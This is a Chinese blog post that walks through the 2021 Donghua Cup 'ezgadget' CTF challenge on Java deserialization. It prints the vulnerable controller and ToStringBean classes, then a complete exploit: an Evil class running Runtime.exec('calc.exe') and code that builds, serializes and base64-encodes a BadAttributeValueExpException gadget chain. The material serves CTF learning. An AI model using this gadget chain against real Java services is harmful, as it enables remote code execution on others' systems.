<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta http-equiv=Content-Security-Policy content="upgrade-insecure-requests"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Java反序列化 | w8nn9z Blog</title><meta name=keywords content><meta name=description content="Java反序列化 - w8nn9z Blog"><meta name=author content><link rel=canonical href=https://blog.w8nn9z.top/posts/web/javaunserialize/><link crossorigin=anonymous href=/assets/css/stylesheet.12a5629d0be5f885fd946d77257e55f74027ed2a35144a29e2db13f8f62b5f35.css integrity rel="preload stylesheet" as=style><link rel=icon href=https://blog.w8nn9z.top/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://blog.w8nn9z.top/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://blog.w8nn9z.top/favicon-32x32.png><link rel=apple-touch-icon href=https://blog.w8nn9z.top/apple-touch-icon.png><link rel=mask-icon href=https://blog.w8nn9z.top/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://blog.w8nn9z.top/posts/web/javaunserialize/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://blog.w8nn9z.top/posts/web/javaunserialize/"><meta property="og:site_name" content="w8nn9z Blog"><meta property="og:title" content="Java反序列化"><meta property="og:locale" content="zh-cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-09-25T00:00:00+00:00"><meta property="article:modified_time" content="2025-09-25T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Java反序列化"><meta name=twitter:description content><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://blog.w8nn9z.top/posts/"},{"@type":"ListItem","position":2,"name":"WEB","item":"https://blog.w8nn9z.top/posts/web/"},{"@type":"ListItem","position":3,"name":"Java反序列化","item":"https://blog.w8nn9z.top/posts/web/javaunserialize/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Java反序列化","name":"Java反序列化","description":"","keywords":[],"articleBody":"2021 东华杯 ezgadget IndexController类：\npackage com.ezgame.ctf.controller; import com.ezgame.ctf.tools.Tools; import java.io.ByteArrayInputStream; import java.io.InputStream; import java.io.ObjectInputStream; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import org.springframework.beans.factory.xml.BeanDefinitionParserDelegate; import org.springframework.stereotype.Controller; import org.springframework.ui.Model; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RequestParam; import org.springframework.web.bind.annotation.ResponseBody; @Controller /* loaded from: ezgadget.jar:BOOT-INF/classes/com/ezgame/ctf/controller/IndexController.class */ public class IndexController { @RequestMapping({\"/\"}) @ResponseBody public String index(HttpServletRequest request, HttpServletResponse response) { return BeanDefinitionParserDelegate.INDEX_ATTRIBUTE; } @RequestMapping({\"/readobject\"}) @ResponseBody public String unser(@RequestParam(name = \"data\", required = true) String data, Model model) throws Exception { byte[] b = Tools.base64Decode(data); InputStream inputStream = new ByteArrayInputStream(b); ObjectInputStream objectInputStream = new ObjectInputStream(inputStream); String name = objectInputStream.readUTF(); int year = objectInputStream.readInt(); if (name.equals(\"gadgets\") \u0026\u0026 year == 2021) { objectInputStream.readObject(); return \"welcome bro.\"; } return \"welcome bro.\"; } } ToStringBean类：\npackage com.ezgame.ctf.tools; import java.io.Serializable; /* loaded from: ezgadget.jar:BOOT-INF/classes/com/ezgame/ctf/tools/ToStringBean.class */ public class ToStringBean extends ClassLoader implements Serializable { private byte[] ClassByte; public String toString() { ToStringBean toStringBean = new ToStringBean(); Class clazz = toStringBean.defineClass((String) null, this.ClassByte, 0, this.ClassByte.length); try { clazz.newInstance(); return \"enjoy it.\"; } catch (IllegalAccessException e) { e.printStackTrace(); return \"enjoy it.\"; } catch (InstantiationException e2) { e2.printStackTrace(); return \"enjoy it.\"; } } } 通过/readobject传入base64编码的恶意序列化类，readObject调用ToStringBean类的toString方法，加载自定义恶意类，先构造恶意类evil：\nimport java.io.IOException; public class Evil { public Evil() throws IOException { Runtime.getRuntime().exec(\"calc.exe\"); } } 生成恶意序列化字符串，注意将ToStringBean类放在com.ezgame.ctf.tools包下：\nimport com.ezgame.ctf.tools.ToStringBean; import java.io.*; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.util.Base64; import javax.management.BadAttributeValueExpException; public class Exploit { public static void main(String[] args) throws Exception{ // 构造恶意类 byte[] evilClassByte = Files.readAllBytes(Paths.get(\"path\\\\to\\\\Evil.class\")); ToStringBean toStringBean = new ToStringBean(); Field classbyteField = toStringBean.getClass().getDeclaredField(\"ClassByte\"); classbyteField.setAccessible(true); classbyteField.set(toStringBean, evilClassByte); // BadAttributeValueExpException.readObject -\u003e ToStringBean.ToString -\u003e 弹计算器 BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(\"test\"); Field valField = badAttributeValueExpException.getClass().getDeclaredField(\"val\"); valField.setAccessible(true); valField.set(badAttributeValueExpException, toStringBean); // 反序列化条件 if (name.equals(\"gadgets\") \u0026\u0026 year == 2021) ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeUTF(\"gadgets\"); objectOutputStream.writeInt(2021); // 最后序列化恶意类 objectOutputStream.writeObject(badAttributeValueExpException); // 输出base64编码序列化结果 byte[] expByte = byteArrayOutputStream.toByteArray(); String base64ExpString = base64Encode(expByte); System.out.println(base64ExpString); // 测试 test(base64ExpString); } public static void test(String data) throws Exception{ byte[] b = base64Decode(data); InputStream inputStream = new ByteArrayInputStream(b); ObjectInputStream objectInputStream = new ObjectInputStream(inputStream); String name = objectInputStream.readUTF(); int year = objectInputStream.readInt(); if (name.equals(\"gadgets\") \u0026\u0026 year == 2021) { objectInputStream.readObject(); System.out.println(\"Yes\"); } System.out.println(\"No\"); } public static String base64Encode(byte[] bytes) { Base64.Encoder encoder = Base64.getEncoder(); return encoder.encodeToString(bytes); } public static byte[] base64Decode(String base64) { Base64.Decoder decoder = Base64.getDecoder(); return decoder.decode(base64); } } data传参base64字符串时注意要将特殊字符转义：\n","wordCount":"586","inLanguage":"en","datePublished":"2025-09-25T00:00:00Z","dateModified":"2025-09-25T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.w8nn9z.top/posts/web/javaunserialize/"},"publisher":{"@type":"Organization","name":"w8nn9z Blog","logo":{"@type":"ImageObject","url":"https://blog.w8nn9z.top/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://blog.w8nn9z.top/ accesskey=h title="w8nn9z Blog (Alt + H)">w8nn9z Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://blog.w8nn9z.top/search title="搜索 (Alt + /)" accesskey=/><span>搜索</span></a></li><li><a href=https://blog.w8nn9z.top/posts title=文章><span>文章</span></a></li><li><a href=https://blog.w8nn9z.top/archives title=归档><span>归档</span></a></li><li><a href=https://blog.w8nn9z.top/about title=关于><span>关于</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Java反序列化</h1><div class=post-meta><span title='2025-09-25 00:00:00 +0000 UTC'>September 25, 2025</span></div></header><aside id=toc-container class="toc-container wide"><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#2021-%e4%b8%9c%e5%8d%8e%e6%9d%af-ezgadget aria-label="2021 东华杯 ezgadget">2021 东华杯 ezgadget</a></li></ul></div></details></div></aside><script>let activeElement,elements;document.addEventListener("DOMContentLoaded",function(){if(checkTocPosition(),elements=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]"),elements.length>0){activeElement=elements[0];const e=encodeURI(activeElement.getAttribute("id")).toLowerCase();document.querySelector(`.inner ul li a[href="#${e}"]`).classList.add("active")}const t=document.getElementById("top-link");t&&t.addEventListener("click",e=>{e.preventDefault(),window.scrollTo({top:0,behavior:"smooth"})})},!1),window.addEventListener("resize",function(){checkTocPosition()},!1),window.addEventListener("scroll",()=>{const e=window.pageYOffset||document.documentElement.scrollTop;if(e===0)return;elements&&elements.length>0&&(activeElement=Array.from(elements).find(t=>{if(getOffsetTop(t)-e>0&&getOffsetTop(t)-e<window.innerHeight/2)return t})||activeElement,elements.forEach(e=>{const n=encodeURI(e.getAttribute("id")).toLowerCase(),t=document.querySelector(`.inner ul li a[href="#${n}"]`);if(e===activeElement){t.classList.add("active");const e=document.querySelector(".toc .inner"),n=t.offsetTop,s=e.clientHeight,o=t.clientHeight,i=n-s/2+o/2;e.scrollTo({top:i,behavior:"smooth"})}else t.classList.remove("active")}))},!1);const main=parseInt(getComputedStyle(document.body).getPropertyValue("--article-width"),10),toc=parseInt(getComputedStyle(document.body).getPropertyValue("--toc-width"),10),gap=parseInt(getComputedStyle(document.body).getPropertyValue("--gap"),10);function checkTocPosition(){const e=document.body.scrollWidth;e-main-toc*2-gap*4>0?document.getElementById("toc-container").classList.add("wide"):document.getElementById("toc-container").classList.remove("wide")}function getOffsetTop(e){if(!e.getClientRects().length)return 0;let t=e.getBoundingClientRect(),n=e.ownerDocument.defaultView;return t.top+n.pageYOffset}</script><div class=post-content><h2 id=2021-东华杯-ezgadget>2021 东华杯 ezgadget<a hidden class=anchor aria-hidden=true href=#2021-东华杯-ezgadget>#</a></h2><p>IndexController类：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> com.ezgame.ctf.controller;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.ezgame.ctf.tools.Tools;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.ByteArrayInputStream;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.InputStream;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.ObjectInputStream;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.servlet.http.HttpServletRequest;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.servlet.http.HttpServletResponse;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.springframework.beans.factory.xml.BeanDefinitionParserDelegate;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.springframework.stereotype.Controller;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.springframework.ui.Model;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.springframework.web.bind.annotation.RequestMapping;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.springframework.web.bind.annotation.RequestParam;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.springframework.web.bind.annotation.ResponseBody;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@Controller</span>
</span></span><span style=display:flex><span><span style=color:#75715e>/* loaded from: ezgadget.jar:BOOT-INF/classes/com/ezgame/ctf/controller/IndexController.class */</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>IndexController</span> {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@RequestMapping</span>({<span style=color:#e6db74>&#34;/&#34;</span>})
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@ResponseBody</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> String <span style=color:#a6e22e>index</span>(HttpServletRequest request, HttpServletResponse response) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> BeanDefinitionParserDelegate.<span style=color:#a6e22e>INDEX_ATTRIBUTE</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@RequestMapping</span>({<span style=color:#e6db74>&#34;/readobject&#34;</span>})
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@ResponseBody</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> String <span style=color:#a6e22e>unser</span>(<span style=color:#a6e22e>@RequestParam</span>(name <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;data&#34;</span>, required <span style=color:#f92672>=</span> <span style=color:#66d9ef>true</span>) String data, Model model) <span style=color:#66d9ef>throws</span> Exception {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> b <span style=color:#f92672>=</span> Tools.<span style=color:#a6e22e>base64Decode</span>(data);
</span></span><span style=display:flex><span>        InputStream inputStream <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ByteArrayInputStream(b);
</span></span><span style=display:flex><span>        ObjectInputStream objectInputStream <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectInputStream(inputStream);
</span></span><span style=display:flex><span>        String name <span style=color:#f92672>=</span> objectInputStream.<span style=color:#a6e22e>readUTF</span>();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span> year <span style=color:#f92672>=</span> objectInputStream.<span style=color:#a6e22e>readInt</span>();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (name.<span style=color:#a6e22e>equals</span>(<span style=color:#e6db74>&#34;gadgets&#34;</span>) <span style=color:#f92672>&amp;&amp;</span> year <span style=color:#f92672>==</span> 2021) {
</span></span><span style=display:flex><span>            objectInputStream.<span style=color:#a6e22e>readObject</span>();
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;welcome bro.&#34;</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;welcome bro.&#34;</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>ToStringBean类：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> com.ezgame.ctf.tools;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.Serializable;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>/* loaded from: ezgadget.jar:BOOT-INF/classes/com/ezgame/ctf/tools/ToStringBean.class */</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>ToStringBean</span> <span style=color:#66d9ef>extends</span> ClassLoader <span style=color:#66d9ef>implements</span> Serializable {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> ClassByte;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> String <span style=color:#a6e22e>toString</span>() {
</span></span><span style=display:flex><span>        ToStringBean toStringBean <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ToStringBean();
</span></span><span style=display:flex><span>        Class clazz <span style=color:#f92672>=</span> toStringBean.<span style=color:#a6e22e>defineClass</span>((String) <span style=color:#66d9ef>null</span>, <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>ClassByte</span>, 0, <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>ClassByte</span>.<span style=color:#a6e22e>length</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>            clazz.<span style=color:#a6e22e>newInstance</span>();
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;enjoy it.&#34;</span>;
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (IllegalAccessException e) {
</span></span><span style=display:flex><span>            e.<span style=color:#a6e22e>printStackTrace</span>();
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;enjoy it.&#34;</span>;
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (InstantiationException e2) {
</span></span><span style=display:flex><span>            e2.<span style=color:#a6e22e>printStackTrace</span>();
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;enjoy it.&#34;</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>通过<code>/readobject</code>传入base64编码的恶意序列化类，readObject调用ToStringBean类的toString方法，加载自定义恶意类，先构造恶意类evil：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> java.io.IOException;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Evil</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>Evil</span>() <span style=color:#66d9ef>throws</span> IOException {
</span></span><span style=display:flex><span>        Runtime.<span style=color:#a6e22e>getRuntime</span>().<span style=color:#a6e22e>exec</span>(<span style=color:#e6db74>&#34;calc.exe&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>生成恶意序列化字符串，注意将ToStringBean类放在com.ezgame.ctf.tools包下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> com.ezgame.ctf.tools.ToStringBean;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.*;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.reflect.Field;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.nio.file.Files;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.nio.file.Paths;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.Base64;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.management.BadAttributeValueExpException;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Exploit</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> Exception{
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 构造恶意类</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> evilClassByte <span style=color:#f92672>=</span> Files.<span style=color:#a6e22e>readAllBytes</span>(Paths.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;path\\to\\Evil.class&#34;</span>));
</span></span><span style=display:flex><span>        ToStringBean toStringBean <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ToStringBean();
</span></span><span style=display:flex><span>        Field classbyteField <span style=color:#f92672>=</span> toStringBean.<span style=color:#a6e22e>getClass</span>().<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;ClassByte&#34;</span>);
</span></span><span style=display:flex><span>        classbyteField.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
</span></span><span style=display:flex><span>        classbyteField.<span style=color:#a6e22e>set</span>(toStringBean, evilClassByte);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// BadAttributeValueExpException.readObject -&gt; ToStringBean.ToString -&gt; 弹计算器</span>
</span></span><span style=display:flex><span>        BadAttributeValueExpException badAttributeValueExpException <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> BadAttributeValueExpException(<span style=color:#e6db74>&#34;test&#34;</span>);
</span></span><span style=display:flex><span>        Field valField <span style=color:#f92672>=</span> badAttributeValueExpException.<span style=color:#a6e22e>getClass</span>().<span style=color:#a6e22e>getDeclaredField</span>(<span style=color:#e6db74>&#34;val&#34;</span>);
</span></span><span style=display:flex><span>        valField.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
</span></span><span style=display:flex><span>        valField.<span style=color:#a6e22e>set</span>(badAttributeValueExpException, toStringBean);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 反序列化条件 if (name.equals(&#34;gadgets&#34;) &amp;&amp; year == 2021)</span>
</span></span><span style=display:flex><span>        ByteArrayOutputStream byteArrayOutputStream <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ByteArrayOutputStream();
</span></span><span style=display:flex><span>        ObjectOutputStream objectOutputStream <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectOutputStream(byteArrayOutputStream);
</span></span><span style=display:flex><span>        objectOutputStream.<span style=color:#a6e22e>writeUTF</span>(<span style=color:#e6db74>&#34;gadgets&#34;</span>);
</span></span><span style=display:flex><span>        objectOutputStream.<span style=color:#a6e22e>writeInt</span>(2021);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 最后序列化恶意类</span>
</span></span><span style=display:flex><span>        objectOutputStream.<span style=color:#a6e22e>writeObject</span>(badAttributeValueExpException);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 输出base64编码序列化结果</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> expByte <span style=color:#f92672>=</span> byteArrayOutputStream.<span style=color:#a6e22e>toByteArray</span>();
</span></span><span style=display:flex><span>        String base64ExpString <span style=color:#f92672>=</span> base64Encode(expByte);
</span></span><span style=display:flex><span>        System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(base64ExpString);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 测试</span>
</span></span><span style=display:flex><span>        test(base64ExpString);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>test</span>(String data) <span style=color:#66d9ef>throws</span> Exception{
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> b <span style=color:#f92672>=</span> base64Decode(data);
</span></span><span style=display:flex><span>        InputStream inputStream <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ByteArrayInputStream(b);
</span></span><span style=display:flex><span>        ObjectInputStream objectInputStream <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectInputStream(inputStream);
</span></span><span style=display:flex><span>        String name <span style=color:#f92672>=</span> objectInputStream.<span style=color:#a6e22e>readUTF</span>();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span> year <span style=color:#f92672>=</span> objectInputStream.<span style=color:#a6e22e>readInt</span>();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (name.<span style=color:#a6e22e>equals</span>(<span style=color:#e6db74>&#34;gadgets&#34;</span>) <span style=color:#f92672>&amp;&amp;</span> year <span style=color:#f92672>==</span> 2021) {
</span></span><span style=display:flex><span>            objectInputStream.<span style=color:#a6e22e>readObject</span>();
</span></span><span style=display:flex><span>            System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;Yes&#34;</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;No&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> String <span style=color:#a6e22e>base64Encode</span>(<span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> bytes) {
</span></span><span style=display:flex><span>        Base64.<span style=color:#a6e22e>Encoder</span> encoder <span style=color:#f92672>=</span> Base64.<span style=color:#a6e22e>getEncoder</span>();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> encoder.<span style=color:#a6e22e>encodeToString</span>(bytes);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> <span style=color:#a6e22e>base64Decode</span>(String base64) {
</span></span><span style=display:flex><span>        Base64.<span style=color:#a6e22e>Decoder</span> decoder <span style=color:#f92672>=</span> Base64.<span style=color:#a6e22e>getDecoder</span>();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> decoder.<span style=color:#a6e22e>decode</span>(base64);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>data传参base64字符串时注意要将特殊字符转义：</p><p><img alt=alt loading=lazy src=/images/JavaUnserialize/1.png></p><hr></div><footer class=post-footer><ul class=post-tags></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://blog.w8nn9z.top/>w8nn9z Blog</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>